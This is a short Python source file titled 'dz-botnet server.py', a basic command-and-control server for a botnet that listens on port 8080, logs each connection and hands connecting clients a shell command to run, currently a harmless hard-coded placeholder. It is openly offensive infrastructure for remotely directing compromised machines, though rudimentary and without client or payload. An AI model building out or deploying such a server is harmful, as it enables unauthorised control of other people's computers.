# dz-botnet server.py
# Basic command & control server.


import datetime
import socket


SERVER_ADDR = ''
SERVER_PORT = 8080

def main():
    # Set up the socket for listening.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((SERVER_ADDR, SERVER_PORT))
    s.listen(5)

    while True:
        # Print listening message.
        print("Waiting for a connection...")

        # Accept connections from clients.
        conn, addr = s.accept()

        # Log the connection.
        with open("access.log", "a") as f:
            f.write(str(datetime.datetime.now()) + ": Connection from " + str(addr) + "\n")

        try:
            # Assemble the data received from the client.
            request = ""
            data = conn.recv(1024)
            request = request + data.decode()

            if request == "REQUEST_COMMAND":
                # Get current commands. Hard coded for now.
                command = "echo hi >> test.txt"

                # Send a message back to the client.
                conn.sendall(command.encode())
    
        finally:
            # Close the connection.
            conn.close()
        
        # Log the disconnection.
        with open("access.log", "a") as f:
            f.write(str(datetime.datetime.now()) + ": Disconnect from " + str(addr) + "\n")

if __name__== "__main__":
      main()

